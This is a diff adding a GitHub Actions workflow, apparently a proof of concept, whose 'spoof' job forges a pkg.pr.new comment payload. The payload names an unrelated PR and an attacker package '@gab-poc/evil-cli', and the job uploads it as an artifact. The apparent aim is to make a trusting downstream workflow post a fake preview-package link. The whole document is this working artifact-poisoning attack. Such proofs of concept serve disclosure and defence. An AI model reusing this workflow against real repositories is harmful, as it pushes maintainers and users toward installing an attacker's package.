@@ -1,0 +1,20 @@
+name: PR Preview Package
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  spoof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge payload naming an unrelated PR
+        run: |
+          cat > pkg-pr-new-comment-payload.json <<'JSON'
+          {"pr":1,"url":"https://pkg.pr.new/@gab-poc/evil-cli@deadbeef","sourceRepo":"gab-poc/evil-skills","sourceBranch":"main"}
+          JSON
+          cat pkg-pr-new-comment-payload.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pkg-pr-new-comment-payload
+          path: pkg-pr-new-comment-payload.json
